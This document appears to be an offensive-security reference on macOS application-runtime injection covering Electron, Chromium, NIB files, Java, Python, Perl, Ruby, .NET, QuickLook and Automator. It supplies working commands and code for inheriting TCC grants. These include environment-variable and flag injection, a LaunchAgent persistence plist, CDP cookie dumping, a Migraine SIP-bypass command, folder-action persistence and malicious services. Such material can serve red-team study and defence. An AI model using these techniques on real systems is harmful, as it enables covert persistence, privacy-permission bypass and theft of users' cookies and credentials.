# Application-Runtime Injection Reference

Techniques for injecting code into macOS applications via their runtime environment -- Electron, Chromium, NIB files, and language interpreters. The injected code inherits the target process's sandbox profile, entitlements, and TCC grants.

---

## Electron Applications

Electron apps run Node.js. Several env vars and CLI flags can turn them into arbitrary-code-execution vectors.

### Electron Fuses

Security flags baked into the Electron Framework binary (sentinel `dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`):

| Fuse | Effect when disabled/enabled |
|------|------------------------------|
| `RunAsNode` | Disabled -> blocks `ELECTRON_RUN_AS_NODE` |
| `EnableNodeOptionsEnvironmentVariable` | Disabled -> ignores `NODE_OPTIONS` |
| `EnableNodeCliInspectArguments` | Disabled -> ignores `--inspect*` flags |
| `EnableEmbeddedAsarIntegrityValidation` | Enabled -> validates asar contents |
| `OnlyLoadAppFromAsar` | Enabled -> only loads `app.asar` |

Check fuses: `npx @electron/fuses read --app /Applications/Target.app`
Modify: locate sentinel in `Electron Framework`, flip `0x30`/`0x31` in a hex editor (breaks signature).

### ELECTRON_RUN_AS_NODE

Starts Electron as a plain Node process, inheriting the app's TCC permissions:
```bash
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# then: require('child_process').execSync('id')
```
Combine with `NODE_OPTIONS="--require /tmp/payload.js"` for file-based payloads. Both blocked when their respective fuses are disabled.

### --inspect / --inspect-brk / --remote-debugging-port

Opens a V8 inspector WebSocket. Connect via `chrome://inspect` or programmatically:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
```
Blocked by `EnableNodeCliInspectArguments` fuse, but `--remote-debugging-port=9222` still works (CDP-level, see Chromium section). Cookie/credential theft via CDP `Network.getAllCookies`.

### ASAR Integrity Bypass (CVE-2023-44402)

Electron <= 22.3.23 / 23-27 pre-releases: a directory named `app.asar` confused the integrity checker, letting arbitrary JS run even with both asar fuses enabled. Fixed in 22.3.24, 24.8.3, 25.8.1, 26.2.1.

### Persistence via LaunchAgent

```xml
<dict>
  <key>EnvironmentVariables</key>
  <dict>
    <key>ELECTRON_RUN_AS_NODE</key><string>true</string>
    <key>NODE_OPTIONS</key><string>--require /tmp/payload.js</string>
  </dict>
  <key>Label</key><string>com.persist.electron</string>
  <key>ProgramArguments</key><array>
    <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
  </array>
  <key>RunAtLoad</key><true/>
</dict>
```

### TCC Bypass via Older Versions

Download an older build of the Electron app that shipped with fuses enabled/disabled differently. The TCC daemon does not check the executed version -- the old binary still receives the app's TCC grants (unless Trust Cache blocks it).

### Tooling

- **electroniz3r** -- enumerates vulnerable Electron apps, verifies fuse state, injects `--inspect` shells.
- **Loki** -- replaces Electron app JS with C2 payloads.

---

## Chromium / Chrome

### Command-Line Flag Injection

Force-quit and relaunch with attacker flags (`open -na "Google Chrome" --args ...`):

| Flag | Purpose |
|------|---------|
| `--remote-debugging-port=9222` | Expose CDP on TCP |
| `--user-data-dir=$TMPDIR/x` | Redirect profile (required for CDP on Chrome >= 136) |
| `--load-extension=./stealer` | Auto-load unpacked extension |
| `--disable-extensions-except=./stealer` | Kill all other extensions |
| `--use-fake-ui-for-media-stream` | Bypass camera/mic prompts |

### Chrome 136 Mitigation (March 2025)

CDP on the default profile is blocked unless `--user-data-dir` points elsewhere. App-Bound Encryption protects real profile cookies. Workaround: spawn a fresh profile, social-engineer auth inside it, then harvest via CDP.

### CDP Abuse

Once attached (`chrome-remote-interface`, `puppeteer`, `playwright`):
```javascript
const {Network, Runtime} = await CDP({port: 9222});
await Network.enable();
const {cookies} = await Network.getAllCookies();   // HttpOnly included
await Runtime.evaluate({expression: "document.cookie"});
```
Also: `Browser.grantPermissions`, `Fetch.enable` (live request interception), `Page.navigate`.

### Extension Debugger API

A malicious extension with the `debugger` permission can `chrome.debugger.attach()` to any tab, gaining full CDP inside the browser -- cookie theft, permission tampering, JS injection, TLS warning bypass. Load via `--load-extension` to skip user interaction.

### Tools

- **snoop** / **VOODOO** (breakpointHQ) -- automated Chromium instrumentation.
- **WhiteChocolateMacademiaNut** -- CDP cookie dumper.

---

## Dirty NIB Technique

### Concept

`.xib`/`.nib` files are serialized AppKit object graphs. The nib loader instantiates arbitrary ObjC classes and Cocoa Bindings can chain method calls at load time -- no user click required.

### Gadget Chain (pre-Ventura)

1. Create `.xib` with `NSAppleScript` (or `NSTask`) + `NSTextField` holding the payload.
2. Wire `NSMenuItem` bindings to call `initWithSource:` then `executeAndReturnError:`.
3. Auto-trigger via `_corePerformAction` binding on a menu item.
4. Replace target app's `Contents/Resources/MainMenu.nib`, launch.

```xml
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="do shell script &quot;id > /tmp/pwned&quot;"/>
<!-- Bindings chain: menuItem -> initWithSource:(A2.title) -> executeAndReturnError: -->
```

Advanced chains: `NSTask` for shell commands, `AppleScriptObjC.framework` for ObjC bridging, Python.framework + ctypes on older systems.

### Modern Mitigations (Ventura+)

- **Deep verification on first launch** -- all bundle resources checked.
- **Bundle protection** -- only same-Team-ID processes (or App Management TCC) can write into another app's bundle.
- **Launch Constraints** -- Apple apps cannot be copied elsewhere and re-launched.
- Python.framework removed in macOS 12.3.

Still exploitable if attacker's process has App Management or Full Disk Access (common for terminals/MDM agents).

### Enumeration

```bash
find /Applications -name Info.plist -exec sh -c \
  'for p; do /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" 2>/dev/null && echo " -> $(dirname "$p")"; done' sh {} +
```

---

## Language-Runtime Injection

### Java

**`_JAVA_OPTIONS`** is read by all JVM invocations:
```bash
# Trigger OOM handler to execute a script
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```

Stealthier: inject a Java agent (`-javaagent:/tmp/Agent.jar`). Agent `premain()` runs before `main()`:
```java
public class Agent {
  public static void premain(String args, Instrumentation inst) {
    Runtime.getRuntime().exec(new String[]{"/usr/bin/open","-a","Calculator"});
  }
}
```
```bash
open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```

**vmoptions files**: many Java apps (Android Studio, IntelliJ) parse `*.vmoptions` from user-writable paths. Drop `-XX:OnOutOfMemoryError` or `-javaagent` there.

### Python

**`PYTHONWARNINGS` + `BROWSER`** chain:
```bash
PYTHONWARNINGS="all:0:antigravity.x:0:0" \
BROWSER="/bin/sh -c 'touch /tmp/pwned' #%s" \
python3 /tmp/any_script.py
```
Works even with `-I` if `-W` is injected before the script argument.

**Homebrew PATH hijacking**: `/opt/homebrew/bin` is typically early in `$PATH`. Drop a trojan binary there (e.g., `ls`) -- it executes with the caller's privileges including `sudo`.

### Perl

| Variable | Usage |
|----------|-------|
| `PERL5OPT` | `'-Mwarnings;system("id")'` -- runs before the target script |
| `PERL5LIB` | Prepend a directory so a malicious `.pm` is loaded first |
| `PERL5DB` | With `-d` flag: `'system("/bin/zsh")'` drops a shell |

**CVE-2023-32369 "Migraine"** (fixed Ventura 13.4): `systemmigrationd` has `com.apple.rootless.install.heritable`. Its child `/usr/bin/perl` honors `PERL5OPT`, granting SIP-less code execution:
```bash
launchctl setenv PERL5OPT '-Mwarnings;system("/tmp/payload.sh")'
open -a "Migration Assistant.app"
```

**@INC hijack**: `/Library/Perl/5.30` exists, is not SIP-protected, and precedes system paths. A root attacker can drop e.g. `File/Basename.pm` there.

### Ruby

**`RUBYOPT`** prepends flags to every `ruby` invocation. `-e` is blocked but `-I`/`-r` are not:
```bash
echo 'system("id")' > /tmp/inject.rb
RUBYOPT="-I/tmp -rinject" ruby /path/to/target.rb
```
Works even if the script passes `--disable-rubyopt`.

### .NET

Every .NET Core process creates two named pipes in `$TMPDIR` (`-in` / `-out`) via `DbgTransportSession`. Connect, send `MT_SessionRequest`, then:
- `MT_ReadMemory` / `MT_WriteMemory` for arbitrary R/W.
- Locate the Dynamic Function Table (DFT) via `MT_GetDCB` -> `m_helperRemoteStartAddr`.
- Overwrite a JIT helper function pointer with shellcode address.

```bash
ls $TMPDIR | grep -E '\-in$|\-out$'   # find .NET debug pipes
vmmap -pages <pid> | grep "rwx/rwx"   # find writable+executable regions
```
Full PoC: https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6

---

## QuickLook Generators

**Passive exploitation**: no "Open" required -- selecting a file in Finder triggers the `.qlgenerator` plugin inside the sandboxed `QuickLookSatellite` helper.

### Attack Surface

- Third-party generators parse complex formats (3D, scientific, archives) -- prime fuzzing targets.
- Place a crafted file in `~/Downloads`; Finder thumbnail generation triggers the exploit automatically.
- User-writable generators in `~/Library/QuickLook/` can be replaced entirely.

### Enumeration

```bash
qlmanage -m plugins 2>&1 | grep -v com.apple   # third-party generators
find ~/Library/QuickLook /Library/QuickLook -name "*.qlgenerator" 2>/dev/null
```

### Sandbox

QuickLookSatellite runs sandboxed (limited FS, network, IPC). Known escape CVEs: CVE-2018-4293, CVE-2019-8741, CVE-2020-9963, CVE-2021-30876.

---

## Automator / Folder Actions / NSServices

### Automator Workflows

`.workflow` bundles look like document files. Contain `com.apple.RunShellScript` actions that execute shell commands.

### Folder Action Persistence

Attach a workflow to a folder; it fires on every file addition -- survives reboots, runs silently:
```bash
osascript -e '
tell application "System Events"
  make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
  tell folder action "Downloads"
    make new script at end of scripts with properties {name:"Trigger", path:"/path/to/evil.workflow"}
  end tell
  set folder actions enabled to true
end tell'
```
A Folder Action on `~/Downloads` fires for every Safari/Chrome/AirDrop download.

### Preference Panes

`.prefPane` bundles load inside System Settings, inheriting its TCC grants. User-level install requires no admin: `cp -r Evil.prefPane ~/Library/PreferencePanes/`.

### NSServices

Registered via `NSServices` in `Info.plist`. Receives cross-app selected text through the Services menu. A malicious service named "Format Text" silently exfiltrates passwords, tokens, or modifies clipboard contents (man-in-the-middle on paste).

---

## Injection Summary Table

| Target | Env Var / Technique | Inherits TCC? | Requires Root? |
|--------|---------------------|---------------|----------------|
| Electron | `ELECTRON_RUN_AS_NODE=1` | Yes | No |
| Electron | `NODE_OPTIONS=--require` | Yes | No |
| Electron | `--inspect` / `--inspect-brk` | Yes | No |
| Electron | `--remote-debugging-port` (CDP) | Yes | No |
| Electron | ASAR replacement | Yes | No (copy to /tmp) |
| Chromium | `--remote-debugging-port` + `--user-data-dir` | Yes | No |
| Chromium | `--load-extension` (debugger API) | Yes | No |
| Dirty NIB | Replace MainMenu.nib in bundle | Yes | No (pre-Ventura) |
| Java | `_JAVA_OPTIONS` (`-XX:OnOutOfMemoryError`) | Yes | No |
| Java | `_JAVA_OPTIONS` (`-javaagent`) | Yes | No |
| Java | vmoptions file write | Yes | No (if user-writable path) |
| Python | `PYTHONWARNINGS` + `BROWSER` | Yes | No |
| Python | Homebrew PATH hijack | Caller's | No |
| Perl | `PERL5OPT` | Yes | No |
| Perl | `PERL5LIB` + module drop | Yes | No (root for /Library) |
| Perl | `PERL5DB` (with `-d`) | Yes | No |
| Perl | CVE-2023-32369 Migraine | SIP-less | Yes |
| Ruby | `RUBYOPT="-I/tmp -rinject"` | Yes | No |
| .NET | DbgTransportSession pipe | Yes | No (same user) |
| QuickLook | Malicious file + vulnerable generator | Sandboxed | No |
| QuickLook | Replace `~/Library/QuickLook/*.qlgenerator` | Sandboxed | No |
| Automator | Folder Action `.workflow` | User-level | No |
| Preference Pane | `.prefPane` in `~/Library/PreferencePanes` | System Settings TCC | No |
| NSServices | Malicious service registration | App-level | No |
